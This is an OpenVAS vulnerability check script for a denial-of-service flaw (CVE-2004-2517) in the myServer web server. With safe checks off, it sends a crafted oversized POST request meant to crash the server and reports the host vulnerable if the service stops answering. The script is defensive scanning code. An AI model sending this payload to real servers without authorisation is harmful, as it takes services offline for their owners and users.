# OpenVAS Vulnerability Test
# $Id: myserver_post_dos.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: myServer POST Denial of Service
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
# based on work from (C) Tenable Network Security
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote host is running myServer, an open-source http server.
This version is vulnerable to remote denial of service attack.

With a specially crafted HTTP POST request, an attacker can cause the service 
to stop responding.";

tag_solution = "Upgrade to the latest version of this software or use another web server";

#  Ref: badpack3t <badpack3t@security-protocols.com> for .:sp research labs:.

if(description)
{
 script_id(14838);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_xref(name:"OSVDB", value:"10333");
 script_cve_id("CVE-2004-2517");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 name = "myServer POST Denial of Service";
 script_name(name);
 

 
 script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_banner");

 
 script_copyright("This script is Copyright (C) 2004 David Maciejak");
 family = "Web application abuses";
 script_family(family);
 
 script_dependencies("gb_get_http_banner.nasl");
 script_mandatory_keys("MyServer/banner");
 script_exclude_keys("www/too_long_url_crash");
 script_require_ports("Services/www", 80);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_http_port(default:80);

if(get_port_state(port))
{
 banner = get_http_banner(port:port);
 if(!banner) exit(0);
 if ( "MyServer" >!< banner ) exit(0);

 if (safe_checks())
 {
 	#Server: MyServer 0.7.1
 	if(egrep(pattern:"^Server: *MyServer 0\.([0-6]\.|7\.[0-1])[^0-9]", string:banner))
        {
          security_message(port);
        }
   exit(0);
 }
 else
 {
   if(http_is_dead(port:port))exit(0);
   data = http_post(item:string("index.html?View=Logon HTTP/1.1\r\n", crap(520), ": ihack.ms\r\n\r\n"), port:port); 
   soc = http_open_socket(port);
   if(soc > 0)
   {
    send(socket:soc, data:data);
    http_close_socket(soc);
    sleep(1);
    soc2 = http_open_socket(port);
    if(!soc2)
    {
	security_message(port);
    }
    else http_close_socket(soc2);
   }
 }
}
